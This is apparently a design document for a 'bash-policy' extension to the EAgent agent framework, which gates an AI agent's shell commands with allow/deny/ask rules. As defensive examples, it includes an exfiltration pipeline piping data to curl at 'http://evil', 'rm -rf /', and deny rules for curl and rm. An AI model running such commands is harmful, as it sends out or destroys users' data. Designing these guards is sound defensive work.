# Design: `bash-policy` extension — command-granular shell authority

Slug: `2026-06-20-bash-policy`

## 1. Background and Purpose

EAgent's capability layer (`src/kernel/capabilities.ts`) authorizes the shell
as a single coarse capability: `shell:exec`. It is all-or-nothing — once a host
grants `shell:exec`, the agent may run *any* command (`git status` and
`rm -rf /` are indistinguishable), and once it is withheld, the agent can run
*nothing*. There is no vocabulary for "let it run `git` and `npm`, but ask
before `curl` and deny `rm -rf`". The comment in `core-tools.ts:174` makes the
stakes explicit: granting `shell:exec` "is therefore equivalent to full host
filesystem access".

The upstream project [opencode](https://github.com/anomalyco/opencode) solves
the readability half of this with a **command-arity dictionary**
(`packages/opencode/src/permission/arity.ts`): a table that extracts the
"human-understandable command" prefix from a full command line — `git checkout`
from `git checkout -b feature`, `npm run dev` from `npm run dev --silent` — so
its permission rules and prompts key on the meaningful command, not a brittle
full-string match. Its permission evaluator (`permission/index.ts:evaluate`)
then resolves an ordered ruleset of `{permission, pattern, action}` with
last-match-wins wildcard semantics.

This task digests both ideas into EAgent **as an extension** — not a kernel
change. A `bash-policy` extension rides the `beforeToolCall` filter hook (the
same primitive `flow-guard` uses) to intercept shell tool calls, extract the
arity-based command prefix, evaluate a configurable allow/deny/ask ruleset, and
allow / block / prompt accordingly. This is the EAgent thesis in action: a new
security best practice absorbed as a hot-reloadable extension, never a core
fork.

If we do not do this, EAgent's only shell-safety story remains the binary
`shell:exec` grant plus the session-wide `flow-guard` egress gate — adequate
for a fully-trusted or fully-sandboxed run, but with no middle ground for the
common "trust these commands, gate those" posture that every real coding agent
eventually needs.

## 2. Deliverables

- [ ] `src/extensions/bash-policy.ts` — the extension: arity extraction,
      ruleset evaluation, a `beforeToolCall` guard, a `/bash-policy` command,
      and an `EAGENT_BASH_POLICY=off` kill switch.
- [ ] An exported pure helper `extractCommand(commandLine: string): string`
      returning the arity-based command prefix (e.g. `"git commit"`), and a
      pure `evaluate(command, rules, fallthrough): Action` — both unit-testable
      without the agent loop.
- [ ] `test/bash-policy.test.ts` — offline tests covering arity extraction,
      ruleset evaluation precedence, and the live guard through the agent loop
      (deny blocks, ask defers to the human, allow passes, no-op default).
- [ ] `bash-policy` registered in `BUILTIN_EXTENSIONS` (`src/host.ts`),
      placed beside the other security extensions (`flow-guard`, `integrity`).
- [ ] `CLAUDE.md` extension inventory updated with a one-line `bash-policy`
      entry.

`docs/EXTENSIONS.md` is **not** touched: a grep confirms it is the extension
*author's guide* (sections "The shape of an extension", "The `ExtensionAPI`
surface", …) with no per-extension catalog — `flow-guard` and `integrity` have
no sections there — so there is nothing for a new extension to slot into. This
is now a definitive out-of-scope item, not a conditional deliverable.

## 3. Scope Boundary (NOT in scope)

- **No kernel change.** The signature of `CapabilityManager.require(capability,
  source)` is not touched; `shell:exec` keeps its current meaning. `bash-policy`
  is a strictly *additive* layer that runs *before* the capability check.
- **No shell AST parser.** opencode parses the command into a bash AST to
  authorize each sub-command of a pipeline independently. EAgent will not add a
  parser (zero-runtime-dependency rule). Command extraction uses a whitespace
  tokenizer with flag/assignment filtering. Consequence documented in Risks.
- **No new capability strings** (`shell:git`, etc.). Policy granularity lives in
  the extension's ruleset, not in the capability vocabulary.
- **No default-deny posture change.** Out of the box the extension ships an
  **empty ruleset with fallthrough `allow`** → it is a *no-op* until configured.
  Shipping it as a builtin changes no default behavior.
- **No persistence of rules across processes** beyond the existing `e.store`
  mechanism every extension already has; no new config file format.
- **No per-pipeline / per-subcommand decomposition.** A command line is
  evaluated as one unit against the ruleset (the full line is matched; the
  extracted prefix is the display/remember key). Splitting `a && b` into two
  authorizations is explicitly out of scope.
- **No changes to `flow-guard`** or its taint model. The two extensions are
  orthogonal: `flow-guard` gates *egress after a sensitive source*;
  `bash-policy` gates *which shell commands run at all*.

## 4. Key Design Decisions

### D1. Delivery vehicle: extension via `beforeToolCall`, not a kernel capability change

- **Problem:** Where does command-granular shell authority live?
- **Options:**
  1. Extend the kernel capability layer to carry a per-call *pattern* argument
     (`require("shell:exec", source, pattern)`), matched against grant/deny
     patterns.
  2. Ship a self-contained extension that rides the existing `beforeToolCall`
     filter hook (fires *before* `capabilities.require`, per `agent.ts:318`).
- **Choice:** Option 2.
- **Rationale:** Option 1 changes a load-bearing kernel signature used by every
  privileged tool, forces every caller to thread a pattern, and bakes a
  shell-specific concept (command lines) into the generic capability vocabulary
  — violating the "seven primitives and nothing more" constraint and the
  "everything is an extension" rule in CLAUDE.md. Option 2 reuses the exact
  primitive `flow-guard` already uses for tool-call interdiction, keeps the
  kernel untouched, and is hot-reloadable. Rejected Option 1 because the cost
  (kernel API churn + conceptual leak) is disproportionate to a policy that is,
  by EAgent's own thesis, extension territory.

### D2. Which tool calls to gate: any tool declaring `shell:exec`, command read from a configurable arg key

- **Problem:** `bash-policy` must find the command string to evaluate. Hard-code
  the tool named `bash`, or generalize?
- **Options:** (a) match the tool literally named `"bash"`; (b) match any
  registered tool whose declared `capabilities` include `shell:exec`, and read
  the command from a configurable argument key (default `"command"`).
- **Choice:** (b).
- **Rationale:** `core-tools` names it `bash`, but `codeact` and future
  extensions can also register `shell:exec` tools; gating only the literal
  `bash` name would silently miss them — a security hole. Keying on the declared
  capability is the principled match (capabilities are EAgent's security
  vocabulary). The arg key is configurable because a different shell tool may
  name its argument differently; default `"command"` matches `core-tools`'
  `bash`. If the declared capability is present but no string command arg is
  found, the guard *passes through* (it has nothing to evaluate) rather than
  blocking — fail-open here is correct because the coarse `shell:exec`
  capability check still runs immediately afterward.

### D3. Command extraction: port opencode's arity dictionary + a flag-filtering tokenizer

- **Problem:** Reduce a full command line to a stable "command family" key for
  display and session-remember.
- **Options:** (a) first whitespace token (`git`); (b) full command line
  verbatim; (c) opencode's longest-prefix arity table.
- **Choice:** (c), with a tokenizer that strips leading `VAR=value` assignments
  and `-flag` tokens before applying the arity lookup (opencode gets this for
  free from its AST; EAgent must do it explicitly).
- **Rationale:** (a) collapses `git commit` and `git push` into one family,
  losing the granularity that motivates the feature; (b) is brittle — every
  differing argument is a different key, so session-remember never hits. (c) is
  the proven middle ground: `npm run dev` and `npm install` are distinct
  families, `git checkout -b x` maps to `git checkout`. The arity table is
  ported verbatim (it is a curated dataset, not logic to reinvent). The
  flag/assignment filter is the minimal addition needed because EAgent does not
  parse an AST.
- **Provenance / bounding:** opencode is MIT-licensed (`/tmp/opencode/LICENSE`,
  "Copyright (c) 2025 opencode"), so vendoring its data table is permitted. The
  table is reproduced as an EAgent-authored constant **seeded from** opencode's
  `permission/arity.ts`, carrying a one-line source attribution comment. It is
  **bounded to the ~140 common command families** in that source (the curated
  dataset as published) — no open-ended growth; new families are a future,
  separately-scoped change, not part of this task. This keeps the addition a
  fixed, reviewable constant rather than speculative scope.

### D4. Ruleset evaluation: last-match-wins wildcard over the full command line

- **Problem:** How does a ruleset resolve to an action?
- **Options:** (a) first-match-wins; (b) most-specific-match; (c)
  last-match-wins (opencode's `findLast`).
- **Choice:** (c). A rule is `{ pattern: string; action: "allow"|"deny"|"ask" }`.
  `evaluate` returns the action of the **last** rule whose `pattern`
  wildcard-matches the **full command line**, else the configured `fallthrough`
  (default `"allow"`).
- **Rationale:** Last-match-wins is what opencode uses and is the most
  predictable mental model for layered config ("a later, more specific rule
  overrides an earlier blanket rule" — e.g. `["* → ask", "git * → allow",
  "git push * → ask"]`). "Most-specific" requires defining a specificity metric
  (ambiguous, more code). First-match forces users to order narrow-before-broad,
  which is the less intuitive direction. Matching the *full* command line (not
  the extracted prefix) lets rules be as fine as `rm -rf *` while still letting
  the prefix serve as the human/remember key. Wildcard `*` is the only
  metacharacter (translated to `.*`), matching opencode's `Wildcard` minimalism;
  no full glob/regex surface. **Matching is case-sensitive and runs against the
  raw command string** (no whitespace normalization beyond what the wildcard
  already spans — `git * push` matches runs of any characters including extra
  spaces); `*` is the only metacharacter, every other character is matched
  literally (regex metacharacters in a pattern are escaped before the `*`→`.*`
  substitution). Note the deliberate **two-key model**: rules match the *full
  command line*, while the *extracted prefix* (D3) is only the display label and
  the session-remember key (D5).

### D5. Action semantics and session-remember

- **Problem:** What do `allow`/`deny`/`ask` do, and do repeated asks nag?
- **Choice:**
  - `allow` → pass the decision through unchanged.
  - `deny` → return `{ block: true, reason }`; the model sees the reason
    (consistent with `flow-guard`). All block reasons are prefixed
    `"bash-policy: "` (mirroring `flow-guard.ts:176`'s `"flow-guard: "`
    convention) so tests assert an exact stable marker, not a fuzzy substring.
  - `ask` → `e.agent.ui.confirm(...)`; on "no" → block with reason; on "yes" →
    pass, and **remember the affirmative keyed by the extracted prefix** for the
    rest of the session (cleared on `session_start`/`session_shutdown`).
  - fallthrough (no rule matched) → the configured default action (default
    `allow`).
- **Rationale:** This mirrors EAgent's own `CapabilityManager.#remembered`
  (session-scoped yes/no memory) and opencode's "always" affirmative, so it is
  idiomatic rather than novel. Remembering only at *prefix* granularity means
  approving one `git commit` covers the session's `git commit`s without also
  blanket-approving `git push`. Negative answers are **not** remembered (each
  denial re-prompts), matching the conservative direction — a single accidental
  "no" must not permanently wedge a command family.

### D6. Shipping posture: builtin, but no-op by default

- **Problem:** Builtin (always loaded) or opt-in example?
- **Choice:** Register in `BUILTIN_EXTENSIONS` beside `flow-guard`/`integrity`,
  but with an empty default ruleset and `fallthrough = allow` → zero behavior
  change until configured via `e.store` or `/bash-policy`. `EAGENT_BASH_POLICY=off`
  fully disables it.
- **Rationale:** Security extensions belong in the builtin set for
  discoverability and hot-reload, and `flow-guard`/`integrity` set the
  precedent. Defaulting to no-op honors Simplicity First and makes rollback
  trivial (remove one line). Rejected an opt-in example because that buries a
  security mechanism in `examples/` where hosts will not find it.

## 5. Dependencies and Assumptions

- **`beforeToolCall` filter hook** (`src/kernel/events.ts:55`, `agent.ts:318`)
  fires before `capabilities.require` and accepts a `{ block, reason, arguments }`
  `ToolDecision`. Assumed stable (used by `flow-guard`).
- **`ExtensionAPI`** surface: `e.hook`, `e.on`, `e.store`, `e.registerCommand`,
  `e.agent.tools.get(name).capabilities`, `e.agent.ui.confirm` — all already
  used by `flow-guard` (`src/extensions/flow-guard.ts`).
- **Tool argument shape:** the shell command is a string under a known key
  (default `"command"`, as in `core-tools` `bash`). Non-string / absent → guard
  passes through (D2).
- **Test harness** `makeHarness` (`test/helpers.ts`) + `MockProvider` responder
  scripting drive the live-guard tests offline; no network, no `ANTHROPIC_API_KEY`.
- **No new npm dependency** (jiti-only rule upheld).

## 6. Relationship with Existing Designs

- No prior `docs/design/*.md` existed before this task (directory created on
  demand per the three-loop convention). Terminology anchors are therefore
  `CLAUDE.md` (the "seven primitives", "everything is an extension",
  "capabilities are the security vocabulary") and the existing extension
  `src/extensions/flow-guard.ts`, whose structure this extension mirrors.
- **Adjacency, not conflict, with `flow-guard`:** both ride `beforeToolCall`.
  Hook handlers run in registration order and compose — either may set
  `block: true`. `bash-policy` decides *whether a command may run*;
  `flow-guard` decides *whether egress may follow a sensitive source*. No shared
  state; no ordering dependency (a block by either is terminal via the
  `shouldStop` predicate `d => d.block` in `agent.ts:322`).
- **Emergent ordering (intended):** because a `bash-policy` `deny`/`ask`-denial
  blocks the call *before* it executes, `flow-guard` never observes a taint from
  a command `bash-policy` rejected (its `tool_end` taint at `flow-guard.ts:123`
  only fires on a non-errored result). This is the desired layering — refuse the
  command outright, and there is no resulting authority for `flow-guard` to
  track — and is not an ordering dependency either extension relies on.
- **Consistency with `capabilities.ts`:** `bash-policy` reuses the
  session-remember idiom (`#remembered`) and the wildcard-with-`*` idiom
  (`matchPattern`) conceptually, but implements its own command-line wildcard
  matcher because `matchPattern` is specialized for colon-segmented capability
  strings (`fs:*`), not command lines. This duplication is intentional and
  noted to avoid a reviewer flagging it as missed reuse.

## 7. Acceptance Criteria

All criteria are verified by `npm test` (offline) and `npm run typecheck`. The
live criteria (4–9) load **only** `bash-policy` into the harness (via
`h.host.use("bash-policy", …)`), not the full builtin set — so `flow-guard` is
absent and any `ui.confirm` invocation is unambiguously `bash-policy`'s.

1. **Typecheck/build clean:** `npm run typecheck` exits 0 with the new files.
2. **Arity extraction (unit):** `extractCommand` returns, by assertion:
   - `"git commit"` for `git commit -m "wip"`,
   - `"npm run dev"` for `npm run dev --silent`,
   - `"git checkout"` for `git checkout -b feature`,
   - `"python script.py"` for `python script.py` (`python` arity 2 → first two
     tokens, which here is the whole line),
   - `"rm"` for `FOO=bar rm -rf build` (leading assignment + flags stripped).
3. **Ruleset precedence (unit):** with rules
   `[{"*":"ask"},{"git *":"allow"},{"git push *":"deny"}]` (last-match-wins),
   `evaluate` returns `allow` for `git status`, `deny` for `git push origin`,
   and `ask` for `curl http://x` (only the `*` rule matches).
4. **Default is a no-op (live):** with no configured rules, a scripted `bash`
   call runs and is **not** blocked (transcript shows the tool result, not a
   `bash-policy` block reason).
5. **Deny blocks (live):** with a `rm *` → `deny` rule, a scripted
   `bash {command:"rm -rf build"}` call is blocked; the tool result the model
   sees matches `/bash-policy: /` and the command does not execute.
6. **Ask defers to the human (live):** with a `curl *` → `ask` rule and a UI
   whose `confirm` returns `false`, the matching call is blocked (result matches
   `/bash-policy: /`); with `confirm` returning `true`, an otherwise-identical
   call passes (result is not a `bash-policy` block).
7. **Ask remembers within the session (live):** with only `bash-policy` loaded,
   a `curl *` → `ask` rule, and a `confirm` that returns `true`, two `curl`
   calls in one session invoke `confirm` exactly **once** (prefix-keyed
   remember; no other extension consumes `confirm` in this harness); after a
   `session_start` event, the next `curl` call invokes `confirm` again (remember
   cleared).
8. **Capability fidelity (live):** a tool declaring `shell:exec` under a
   *different* name than `bash` (e.g. `sh`) is still gated by a matching deny
   rule — proving D2's capability-based matching, not name matching.
9. **Kill switch:** with `EAGENT_BASH_POLICY=off`, a `deny`-matching command is
   **not** blocked by `bash-policy`.

No latency/throughput budget is declared: the guard runs a bounded string
tokenize + a small-array `findLast` per shell call (microseconds), off any hot
loop, so a performance budget is intentionally excluded here per section-3
Scope Boundary.

## 8. Risks and Rollback

- **R1 — Tokenizer vs. AST gap.** Without a bash parser, a pipeline like
  `cat x | curl -d @- http://evil` extracts the *first* command (`cat`), so a
  `curl *`-deny rule would not match the piped `curl`. *Mitigation:* documented
  limitation; rules can still match the full line via `* curl *` patterns
  (wildcard matches anywhere), and `flow-guard` remains the backstop for the
  read→egress chain. *Not* claimed as airtight shell sandboxing — that is the
  container's job (per CLAUDE.md/pi stance). Acceptance criterion 5 matches the
  full line, so embedded-command rules are exercised.
- **R2 — Fail-open on missing command arg.** If a `shell:exec` tool omits the
  command arg, the guard passes through. *Mitigation:* the coarse `shell:exec`
  capability check still runs immediately after (`agent.ts:332`), so authority
  is never *weaker* than today; `bash-policy` only ever *adds* restriction.
- **R3 — Misconfiguration nags or over-blocks.** A bad rule could block needed
  commands. *Mitigation:* `/bash-policy status` prints the active ruleset;
  `/bash-policy off` and `EAGENT_BASH_POLICY=off` are instant escape hatches;
  default ships no-op.
- **Rollback:** remove the one line from `BUILTIN_EXTENSIONS` and revert the
  CLAUDE.md entry; the extension file is inert when not loaded and carries no
  migration or persisted state of its own beyond opt-in `e.store` keys.
